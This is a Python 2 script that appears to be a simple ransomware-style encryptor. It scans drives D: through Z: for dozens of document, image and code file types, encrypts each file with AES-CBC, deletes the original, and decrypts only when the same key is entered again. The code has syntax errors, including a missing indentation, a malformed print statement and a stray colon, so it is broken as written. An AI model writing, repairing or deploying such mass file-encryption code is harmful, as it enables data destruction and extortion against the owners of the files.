from Crypto import Random
from Crypto.Cipher import AES
import os.path
import os, sys

class aes_cbc:
    
    def __init__(self, key):
        self.key = key
        self.drive = 'C'
        self.extensions = ['.txt', '.jpeg', '.jpg', '.log', '.html', '.css', '.js', '.doc', '.docx', '.pdf', '.dot', '.wbk', '.docm', '.dotx', '.docb', '.xls', '.xlt', '.xlsx', '.xlsm','.xltx', '.xltm', '.xlsb', '.xla', '.xlam', '.xll', '.xlw', '.ppt', '.pot', '.pps', '.pptx', '.pptm', '.potx', '.potm', '.ppam', '.ppsx', '.ppsm', '.sldx', '.sldm', '.pub', '.xps', '.py', '.java', '.cpp', '.gif', '.png', '.bmp']



########################## ENCRYPTION #########################

    def filesenc(self):
        
        l_files = []
        
        while True:
            self.drive = chr(ord(self.drive) + 1)
            path = self.drive + ':\\'
            if os.path.exists(path):
                for dirpath, dirs, files in os.walk(path):
                    for file in files:
                        for ext in self.extensions:
                            if file.endswith(ext) or file.endswith(ext.upper()):
                            f = dirpath+'\\'+str(file)
                            l_files.append(f)
            
            if self.drive == 'Z':
                break

        print "Total Files To Be Processed: "len(l_files), '\n'

        for file in l_files:
            self.enc_file_generation(file)
    
                
    def enc_file_generation(self, file_name):
        with open(file_name, 'rb') as fo:
            text = fo.read()
        enc = self.encryption(text, self.key)

        with open(file_name+str('.enc'), 'wb') as fo:
            fo.write(enc)
        print "EN: ", file_name
        os.remove(file_name)

    def encryption(self, message, key, key_size = 256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

######################## DECRYPTION ##########################

    def filesdnc(self):
        
        l_files = []

        while True:
            self.drive = chr(ord(self.drive) + 1)
            path = self.drive + ':\\'
            if os.path.exists(path):
                for dirpath, dirs, files in os.walk(path):
                    for file in files:
                            if file.endswith('.enc'):
                                f = dirpath+'\\'+str(file)
                                l_files.append(f)
                
            if self.drive == 'Z':
                break
        
        for file in l_files:
            self.dnc_file_generation(file)

    
    
    def dnc_file_generation(self, file_name):
        with open(file_name, 'rb') as fo:
            text = fo.read()
            dec = self.decryption(text, self.key):
        with open(file_name[:-4], 'wb') as fo:
            fo.write(dec)
        print "DE: ", file_name
        os.remove(file_name)

    def decryption(self, cipherText, key):
        iv = cipherText[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.decrypt(cipherText[AES.block_size:]).rstrip(b"\0")

########################## PADDING #########################
    
    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


######################### MENU ########################

    def options(self):
        print "\n1) Encrypt\n2) Decrypt\n3) EXIT"
        inp = input('\nChoice> ')

        if inp == 1:
            obj.filesenc()
            obj.options()

        if inp == 2:
            k = raw_input('Enter 16 Byte Key: \n')
            if k == key:
                obj.filesdnc()
            else:
                print "Wrong Key! Try Again!\n"
                obj.options()

        if inp == 3:
            sys.exit


key = raw_input('Enter 16 Byte Key: ')
obj = aes_cbc(key)
obj.options()
